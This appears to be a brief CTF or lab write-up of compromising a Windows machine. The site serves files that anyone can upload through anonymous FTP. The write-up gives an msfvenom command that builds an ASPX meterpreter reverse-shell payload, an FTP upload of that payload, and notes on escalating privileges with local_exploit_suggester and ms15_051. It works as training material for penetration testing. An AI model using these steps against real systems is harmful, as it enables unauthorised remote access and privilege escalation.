# The machine has ftp service that has anonymous login, on where users can upload file that reflects on the site

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```

> Created a reverse shell payload using msfvenom and spun up a multi/handler reverse shell listener on msfconsole

```
ftp> put reverse.aspx
```


> uploaded it to the ftp server using put, gained shell, used the post exploitation module "local_exploit_suggester" then used the ms15_051 exploit




